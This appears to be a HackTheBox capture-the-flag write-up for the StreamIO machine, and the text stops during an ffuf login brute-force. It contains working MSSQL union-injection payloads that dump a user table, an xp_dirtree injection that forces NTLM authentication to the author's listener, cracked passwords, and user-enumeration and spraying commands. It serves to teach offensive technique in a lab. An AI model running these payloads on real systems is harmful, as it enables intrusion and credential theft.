---
render_with_liquid: false
title: HackTheBox Writeup  StreamIO
date: 2023-12-25 13:02:04 +1400
tags: [hackthebox, nmap, windows, ad, netexec, feroxbuster, ffuf, php, sqli, sqli-union, mssql, hashcat, password-spraying, kerbrute, smartbrute, fuzz-param, local-file-inclusion, rfi, reverse-ssh, winpeas, port-forwarding, mssqlclient, discover-backup, ldapdomaindump, discover-browser, mozilla-password, hack-browser-data, bloodhound, bloodhound-python, ad-laps, dacledit, dacl-abuse, evil-winrm, oscp-like-2023, privilege-token, juicy-potato-ng, responder, coerce-authentication]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ pt init '10.129.58.72 streamIO.htb DC.streamIO.htb watch.streamIO.htb'
+----------+--------+--------------+-----------------+
| PROFILE  | STATUS |      IP      |     DOMAIN      |
+----------+--------+--------------+-----------------+
| streamio | on     | 10.129.58.72 | streamIO.htb    |
| streamio | on     | 10.129.58.72 | DV.streamIO.htb |
+----------+--------+--------------+-----------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Dec 25 13:02:03 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49678,49705,59294 streamIO.htb
Nmap scan report for streamIO.htb (10.129.58.72)
Host is up, received user-set (0.41s latency).
Scanned at 2023-12-25 13:02:04 CST for 199s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-12-25 12:01:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 3BBA52018DC9C10518012FB1E55ABBF8
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a:2c8d:a0b8:b10a:eefa:be20:4abd:ecaf
| SHA-1: 6c6a:3f5c:7536:61d5:2da6:0e66:75c0:56ce:56e4:656d
| -----BEGIN CERTIFICATE-----
| MIIDYjCCAkqgAwIBAgIUbdDRZxR55nbfMxJzBHWVXcH83kQwDQYJKoZIhvcNAQEL
| BQAwIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0cmVhbUlPMB4XDTIyMDIyMjA3
| MDMyOFoXDTIyMDMyNDA3MDMyOFowIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0
| cmVhbUlPMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2QSO8noWDU+A
| MYuhSMrB2mA+V7W2gwMdTHxYK0ausnBHdfQ4yGgAs7SdyYKXf8fA502x4LvYwgmd
| 67QtQdYtsTSv63SlnEW3zjJyu/dRW0cwMfBCqyiLgAScrxb/6HOhpnOAzk0DdBWE
| 2vobsSSAh+cDHVSuSbEBLqJ0GEL4hcggHhQq6HLRmmrb0wGjL1WIwjQ8cCWcFzzw
| 5Xe3gEe+aHK245qZKrZtHuXelFe72/nbF8VFiukkaBMgoh6VfpM66nMzy+KeLfhP
| FkxBt6osGUHwSnocJknc7t+ySRVTACAMPjbbPGEl4hvNEcZpepep6jD6qgi4k7bL
| 82Nu2AeSIQIDAQABo4GTMIGQMB0GA1UdDgQWBBRf0ALWCgvVfRgijR2I0KY0uRjY
| djAfBgNVHSMEGDAWgBRf0ALWCgvVfRgijR2I0KY0uRjYdjAPBgNVHRMBAf8EBTAD
| AQH/MCsGA1UdEQQkMCKCDHN0cmVhbUlPLmh0YoISd2F0Y2guc3RyZWFtSU8uaHRi
| MBAGA1UdIAQJMAcwBQYDKgMEMA0GCSqGSIb3DQEBCwUAA4IBAQCCAFvDk/XXswL4
| cP6nH8MEkdEU7yvMOIPp+6kpgujJsb/Pj66v37w4f3us53dcoixgunFfRO/qAjtY
| PNWjebXttLHER+fet53Mu/U8bVQO5QD6ErSYUrzW/l3PNUFHIewpNg09gmkY4gXt
| oZzGN7kvjuKHm+lG0MunVzcJzJ3WcLHQUcwEWAdSGeAyKTfGNy882YTUiAC3p7HT
| 61PwCI+lO/OU52VlgnItRHH+yexBTLRB+Oa2UhB7GnntQOR1S5g497Cs3yAciST2
| JaKhcCnBY1cWqUSAm56QK3mz55BNPcOUHLhrFLjIaWRVx8Ro8QOCWcxkTfVcKcR+
| DSJTOJH8
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-25T12:05:01+00:00; +6h59m44s from scanner time.
|_http-title: Streamio
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59294/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-12-25T12:04:23
|_  start_date: N/A
|_clock-skew: mean: 6h59m43s, deviation: 0s, median: 6h59m43s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52507/tcp): CLEAN (Timeout)
|   Check 2 (port 17857/tcp): CLEAN (Timeout)
|   Check 3 (port 18159/udp): CLEAN (Timeout)
|   Check 4 (port 26791/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Dec 25 13:05:23 2023 -- 1 IP address (1 host up) scanned in 199.98 seconds
```


## 445 - SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc smb streamIO.htb -u '' -p ''
SMB         10.129.58.72    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.129.58.72    445    DC               [-] streamIO.htb\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc smb streamIO.htb -u 'x' -p ''
SMB         10.129.58.72    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.129.58.72    445    DC               [-] streamIO.htb\x: STATUS_LOGON_FAILURE
```

## 80 - Site : IIS Windows Server


### Info

![](/assets/obsidian/5e31463a601e73e98a90a9e995bb080a.png)

### Directory

```bash
feroxbuster -t 150 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_80.txt -k -u http://streamio.htb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat ferox_80.txt | awk '$1!=403 && $1!=404'
200      GET      334l     2089w   180418c http://streamio.htb/iisstart.png
200      GET       32l       55w      703c http://streamio.htb/
301      GET        2l       10w      157c http://streamio.htb/aspnet_client => http://streamio.htb/aspnet_client/
301      GET        2l       10w      168c http://streamio.htb/aspnet_client/system_web => http://streamio.htb/aspnet_client/system_web/
```

## 443 - Streamio


### Info

```ruby
https://streamIO.htb [200] [Streamio] [Microsoft-IIS/10.0] [Bootstrap:5.1.3,IIS:10.0,PHP:7.2.26,Windows Server] [010f15fa0a6daf937ca503b924019296542a5051]
```

![](/assets/obsidian/abb5c303e5eee98b6fe51530023600ef.png)

### Directory

```bash
feroxbuster -t 150 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_443.txt -k -u https://streamio.htb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat ferox_443.txt | awk '$1!=404 && $1!=403'
200      GET      231l      571w     7825c https://streamio.htb/about.php
200      GET      206l      430w     6434c https://streamio.htb/contact.php
200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png
200      GET      863l     1698w    16966c https://streamio.htb/css/style.css
200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js
200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css
200      GET      395l      915w    13497c https://streamio.htb/index.php
200      GET      111l      269w     4145c https://streamio.htb/login.php
200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js
200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg
200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png
301      GET        2l       10w      150c https://streamio.htb/ADMIN => https://streamio.htb/ADMIN/
301      GET        2l       10w      150c https://streamio.htb/Admin => https://streamio.htb/Admin/
200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png
200      GET      395l      915w    13497c https://streamio.htb/
301      GET        2l       10w      151c https://streamio.htb/Images => https://streamio.htb/Images/
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
301      GET        2l       10w      157c https://streamio.htb/ADMIN/Images => https://streamio.htb/ADMIN/Images/
301      GET        2l       10w      157c https://streamio.htb/Admin/Images => https://streamio.htb/Admin/Images/
301      GET        2l       10w      157c https://streamio.htb/admin/Images => https://streamio.htb/admin/Images/
301      GET        2l       10w      148c https://streamio.htb/css => https://streamio.htb/css/
200      GET        1l        7w     2054c https://streamio.htb/favicon.ico
301      GET        2l       10w      150c https://streamio.htb/fonts => https://streamio.htb/fonts/
301      GET        2l       10w      154c https://streamio.htb/ADMIN/css => https://streamio.htb/ADMIN/css/
301      GET        2l       10w      154c https://streamio.htb/Admin/css => https://streamio.htb/Admin/css/
301      GET        2l       10w      151c https://streamio.htb/images => https://streamio.htb/images/
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
301      GET        2l       10w      147c https://streamio.htb/js => https://streamio.htb/js/
301      GET        2l       10w      156c https://streamio.htb/ADMIN/fonts => https://streamio.htb/ADMIN/fonts/
301      GET        2l       10w      157c https://streamio.htb/ADMIN/images => https://streamio.htb/ADMIN/images/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -k -t 100 -u https://streamio.htb/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://streamio.htb/
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: watch.streamio.htb Status: 200 [Size: 2829]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

# User Flag
---

## Enumeration

### 443 - streamio.htb


#### Information in TLS certificate

- another subdomain `watch.streamIO.htb`
- `streamIO` could be a username

```ruby
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
```

#### Usernames

> https://streamio.htb/about.php

There are some usernames in about page

![](/assets/obsidian/b78c6ca8fa352bcbb6db786fad5baf5a.png)

They are not valid usernames in AD

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat users_web.txt
Barry
Oliver
Samantha

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ kerbrute userenum -d streamio.htb --dc DC.streamio.htb users_web.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/25/23 - Ronnie Flathers @ropnop

2023/12/25 15:40:37 >  Using KDC(s):
2023/12/25 15:40:37 >   DC.streamio.htb:88

2023/12/25 15:40:37 >  Done! Tested 3 usernames (0 valid) in 0.345 seconds
```

#### Login / Register function

> https://streamio.htb/register.php

![](/assets/obsidian/44f77062e94d2f4477601070801bf2b5.png)

I've registered an account but can't login

> https://streamio.htb/login.php

![](/assets/obsidian/44832cc6c180d1a967362769606c25cb.png)

### 443 - watch.streamio.htb


#### Info

![](/assets/obsidian/f6eb2dd118f236709c66d87f74001e84.png)

According to the source code, I suspect a login page exists

![](/assets/obsidian/34aae096c3ad0ebbe5e9c007164b5cd8.png)


#### Directories

On windows, the dir path is case insensitive

```bash
feroxbuster -u https://watch.streamio.htb/ -t 150 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "txt,html,php" -v -k -n -e -r -o ferox_watch_full.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat ferox_watch_full.txt | awk '$1!=400&&$1!=404'
200      GET      136l      295w    22042c https://watch.streamio.htb/static/logo.png
200      GET      192l     1006w    82931c https://watch.streamio.htb/static/icon.png
200      GET       72l      112w      875c https://watch.streamio.htb/static/css/index.css
200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET       25l       34w      247c https://watch.streamio.htb/static/css/search.css
200      GET    10837l    20418w   195704c https://watch.streamio.htb/static/css/bootstrap.css
200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php
403      GET       29l       92w     1233c https://watch.streamio.htb/static/
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
```


## Shell as yoshihide

### SQLI (MSSQL)


#### Identify

> https://watch.streamio.htb/search.php

Fuzz for special characters

Save search request from burp history to file

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat search.req
POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers

q=FUZZ
```

There were some characters injected into SQL query, `%`, `%`, `_` returned all results, but others vary

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ffuf -c -request search.req -w /usr/share/seclists/Fuzzing/special-chars.txt -fs 1031 -x http://127.0.0.1:8080


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://watch.streamio.htb/search.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Te: trailers
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Referer: https://watch.streamio.htb/search.php
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Host: watch.streamio.htb
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Dnt: 1
 :: Header           : Sec-Gpc: 1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: https://watch.streamio.htb
 :: Header           : Sec-Fetch-Mode: navigate
 :: Data             : q=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1031
________________________________________________

)                       [Status: 200, Size: 1345, Words: 64, Lines: 42, Duration: 95ms]
!                       [Status: 200, Size: 2144, Words: 98, Lines: 66, Duration: 93ms]
?                       [Status: 200, Size: 1612, Words: 77, Lines: 50, Duration: 104ms]
(                       [Status: 200, Size: 1345, Words: 64, Lines: 42, Duration: 103ms]
-                       [Status: 200, Size: 10048, Words: 513, Lines: 282, Duration: 123ms]
.                       [Status: 200, Size: 6704, Words: 330, Lines: 194, Duration: 126ms]
/                       [Status: 200, Size: 1303, Words: 58, Lines: 42, Duration: 128ms]
,                       [Status: 200, Size: 3934, Words: 198, Lines: 114, Duration: 131ms]
:                       [Status: 200, Size: 29151, Words: 1600, Lines: 786, Duration: 197ms]
+                       [Status: 200, Size: 196043, Words: 9831, Lines: 5506, Duration: 208ms]
_                       [Status: 200, Size: 253600, Words: 12351, Lines: 7186, Duration: 230ms]
%                       [Status: 200, Size: 253600, Words: 12351, Lines: 7186, Duration: 233ms]
&                       [Status: 200, Size: 253600, Words: 12351, Lines: 7186, Duration: 242ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

![](/assets/obsidian/005e24e80a92dfc4e0061b8dfa0de230.png)

The backend SQL query may look like this :

```bash
select * from movies where name like '%USER_QUERY%';
```

#### Enumerate DB

> MSSQL Injection Cheat Sheet - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

Check columns

```sql
500' union select 1,2,3,4,5,6 -- -
```

![](/assets/obsidian/ca1a08835f70b5161d4d9d350e5782df.png)

Database version

```sql
500' union select 1,@@version,3,4,5,6 -- -
```

![](/assets/obsidian/f46d910cebfeb6c5385b08627f60c178.png)

Current user

```sql
500' union select 1,CURRENT_USER,3,4,5,6 -- -
```

![](/assets/obsidian/e481e96c7f84f95c3af787662a44226b.png)

Current database

```sql
500' union select 1,DB_NAME(),3,4,5,6 -- -
```

![](/assets/obsidian/b397dbfa73de043186d3b9e5c801c8b4.png)

Databases

```sql
500' union select 1,(SELECT STRING_AGG(name, ', ') FROM master..sysdatabases),3,4,5,6 -- -
```

![](/assets/obsidian/a6bf58e772c2376fd2f18d0f3045aab0.png)

Tables in `STREAMIO` database

```sql
500' union select 1,(SELECT STRING_AGG(name, ', ') FROM STREAMIO..sysobjects WHERE xtype = 'U'),3,4,5,6 -- -
```

![](/assets/obsidian/95cde2a051c4c556c032e7b53110e9b1.png)

Tables in `streamio_backup` (No results)

```sql
500' union select 1,(SELECT STRING_AGG(name, ', ') FROM streamio_backup..sysobjects WHERE xtype = 'U'),3,4,5,6 -- -
```

![](/assets/obsidian/155fb30dcd3708893b5ef28dfd07eb95.png)

Columns in `users` table

```bash
500' union select 1,(SELECT STRING_AGG(name, ', ') FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')),3,4,5,6 -- -
```

![](/assets/obsidian/fb3e322879d1fb92d2441291690f3198.png)

`users` table data

```sql
500' union select 1,(SELECT STRING_AGG(CONCAT(username,':',password,':',is_staff), '<br>') FROM users),3,4,5,6 -- -
```

![](/assets/obsidian/28c2192dc683268f54a7fdf63c50842d.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat loot/users.raw | sed 's/<br>/\n/g'
James                                             :c660060492d9edcaa8332d89c99c9239                  :1
Theodore                                          :925e5408ecb67aea449373d668b7359e                  :1
Samantha                                          :083ffae904143c4796e464dac33c1f7d                  :1
Lauren                                            :08344b85b329d7efd611b7a7743e8a09                  :1
William                                           :d62be0dc82071bccc1322d64ec5b6c51                  :1
Sabrina                                           :f87d3c0d6c8fd686aacc6627f1f493a5                  :1
Robert                                            :f03b910e2bd0313a23fdd7575f34a694                  :1
Thane                                             :3577c47eb1e12c8ba021611e1280753c                  :1
Carmon                                            :35394484d89fcfdb3c5e447fe749d213                  :1
Barry                                             :54c88b2dbd7b1a84012fabc1a4c73415                  :1
Oliver                                            :fd78db29173a5cf701bd69027cb9bf6b                  :1
Michelle                                          :b83439b16f844bd6ffe35c02fe21b3c0                  :1
Gloria                                            :0cfaaaafb559f081df2befbe66686de0                  :1
Victoria                                          :b22abb47a02b52d5dfa27fb0b534f693                  :1
Alexendra                                         :1c2b3d8270321140e5153f6637d3ee53                  :1
Baxter                                            :22ee218331afd081b0dcd8115284bae3                  :1
Clara                                             :ef8f3d30a856cf166fb8215aca93e9ff                  :1
Barbra                                            :3961548825e3e21df5646cafe11c6c76                  :1
Lenord                                            :ee0b8a0937abd60c2882eacb2f8dc49f                  :1
Austin                                            :0049ac57646627b8d7aeaccf8b6a936f                  :1
Garfield                                          :8097cedd612cc37c29db152b6e9edbd3                  :1
Juliette                                          :6dcd87740abb64edfa36d170f0d5450d                  :1
Victor                                            :bf55e15b119860a6e6b5a164377da719                  :1
Lucifer                                           :7df45a9e3de3863807c026ba48e55fb3                  :1
Bruno                                             :2a4e2cf22dd8fcb45adcb91be1e22ae8                  :1
Diablo                                            :ec33265e5fc8c2f1b0c137bb7b3632b5                  :1
Robin                                             :dc332fb5576e9631c9dae83f194f8e70                  :1
Stan                                              :384463526d288edcc95fc3701e523bc7                  :1
yoshihide                                         :b779ba15cedfd22a023c4d8bcf5f2332                  :1
admin                                             :665a50ac9eaa781e4f7f04199db97a11                  :0
```


#### Use dirtree to ceorce auth

```bash
sudo responder -A -I tun0 -v
```

```sql
500'; use master; exec xp_dirtree '\\10.10.14.21\x\ok.png'-- -
```

The password of machine account is unlikely crackable since the length will be 120 by default

```bash
[SMB] NTLMv2-SSP Client   : 10.129.62.191
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:23112f1d9f25ec70:CF850B33CCBA32B4D57D5EAF2AD28944:01010000000000000091638E064ADA01D760FB8930F9F8950000000002000800440032004600580001001E00570049004E002D00430048004B0048005A003700420047005A003600320004003400570049004E002D00430048004B0048005A003700420047005A00360032002E0044003200460058002E004C004F00430041004C000300140044003200460058002E004C004F00430041004C000500140044003200460058002E004C004F00430041004C00070008000091638E064ADA0106000400020000000800300030000000000000000000000000300000EF450137A103452CC16151F8003018E74838EFDB22CF707A164F8B33C16B01450A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000
```


### Crack user hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat loot/users.raw | sed 's/<br>/\n/g' | tr -d ' ' | sed 's/..$//' > loot/users.hash

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ hashcat loot/users.hash /opt/wordlists/rockyou.txt --user -m 0

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ hashcat loot/users.hash /opt/wordlists/rockyou.txt --user -m 0 --show
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
```

### Password spray for AD

Extract users and passwords

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ hashcat loot/users.hash /opt/wordlists/rockyou.txt --user -m 0 --show > hashcat_users.txt

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat hashcat_users.txt | cut -d: -f1 > users.lst

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat hashcat_users.txt | cut -d: -f3 > pass.lst
```

Only `yoshihide` is a valid domain user

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ kerbrute userenum -d streamIO.htb --dc DC.streamIO.htb users.lst -o kerbrute.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/18/24 - Ronnie Flathers @ropnop

2024/01/18 11:57:29 >  Using KDC(s):
2024/01/18 11:57:29 >   DC.streamIO.htb:88

2024/01/18 11:57:29 >  [+] VALID USERNAME:       yoshihide@streamIO.htb
2024/01/18 11:57:29 >  Done! Tested 12 usernames (1 valid) in 0.173 seconds
```

None of the passwords are successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bu 'yoshihide' -bP pass.lst kerberos -d streamIO.htb

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
┌────────┬──────┬──────────┬─────────┐
│ domain │ user │ password │ details │
├────────┼──────┼──────────┼─────────┤
└────────┴──────┴──────────┴─────────┘
```

### Password spray for port 443

Tried admin's credential at `https://streamio.htb/login.php` but failed

Save the login request from burp history, use **ffuf** to brute force credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat login.req
POST /login.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=o8j2vob90b8741me7hc64hqm1q
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://streamio.htb
Referer: https://streamio.htb/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers

username=FUZZ1&password=FUZZ2
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ ffuf -c -request login.req -w users.lst:FUZZ1 -w pass.lst:FUZZ2 -fr 'Login failed'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://streamio.htb/login.php
 :: Wordlist         : FUZZ1: /home/kali/htb/StreamIO/users.lst
 :: Wordlist         : FUZZ2: /home/kali/htb/StreamIO/pass.lst
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: https://streamio.htb/login.php
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Origin: https://streamio.htb
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Dnt: 1
 :: Header           : Sec-Gpc: 1
 :: Header           : Te: trailers
 :: Header           : Cookie: PHPSESSID=o8j2vob90b8741me7hc64hqm1q
